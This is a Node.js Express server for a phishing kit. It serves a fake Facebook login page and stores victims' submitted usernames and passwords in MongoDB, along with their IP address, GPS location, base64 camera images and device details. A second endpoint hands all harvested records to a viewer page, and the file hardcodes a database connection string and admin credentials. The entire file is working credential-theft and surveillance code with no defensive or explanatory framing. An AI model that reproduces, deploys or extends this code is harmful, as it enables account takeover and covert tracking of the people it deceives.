const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(cors());
app.use(express.static(__dirname));

// MongoDB Connection
const MONGO_URI = "mongodb+srv://ktalpada484_db_user:sumit1123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB Connected Successfully! Data is permanent."))
    .catch(err => console.log("DB Connection Error: ", err));

// Free Fire / Social Login (Facebook/Google) Log Schema
const FFLogSchema = new mongoose.Schema({
    id: String,
    ip: String,
    platform: String,
    instagram_username: String,
    instagram_password: String,
    latitude: String,
    longitude: String,
    image_base64: String,
    system: Object,
    timestamp: { type: Date, default: Date.now }
});
const FFLogModel = mongoose.model('FFLog', FFLogSchema);

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.get('/facebook.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.get('/viewer.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

// Admin Login Check
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'sumit@1123' && password === 'sumit1123') {
        res.status(200).json({ status: 'success', message: 'Login Successful' });
    } else {
        res.status(401).json({ status: 'error', message: 'Invalid Credentials' });
    }
});

// Free Fire & Social Logins Data Collect (Facebook, Google, etc.)
app.post('/api/collect-ff', async (req, res) => {
    try {
        const recordId = 'FF_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };

        const newFFLog = new FFLogModel({
            id: recordId,
            ip: clientIp,
            platform: req.body.platform || 'Unknown',
            instagram_username: req.body.instagram_username || 'N/A',
            instagram_password: req.body.instagram_password || 'N/A',
            latitude: loc.latitude || 'N/A',
            longitude: loc.longitude || 'N/A',
            image_base64: req.body.image_base64 || null,
            system: req.body.system || {}
        });

        await newFFLog.save();
        res.status(200).json({ status: 'success' });
    } catch (err) {
        res.status(500).json({ status: 'error', error: err.message });
    }
});

// Get Data API for viewer.html (Supports both /api/get-logs and /api/get-ff-data)
const getLogsHandler = async (req, res) => {
    try {
        const logs = await FFLogModel.find().sort({ timestamp: -1 });
        
        // Format data properly so viewer.html can read location nested object easily
        const formattedLogs = logs.map(log => ({
            id: log.id,
            platform: log.platform,
            instagram_username: log.instagram_username,
            instagram_password: log.instagram_password,
            location: {
                latitude: log.latitude,
                longitude: log.longitude
            },
            image_base64: log.image_base64,
            system: log.system,
            timestamp: log.timestamp
        }));

        res.status(200).json(formattedLogs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};

app.get('/api/get-logs', getLogsHandler);
app.get('/api/get-ff-data', getLogsHandler);

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
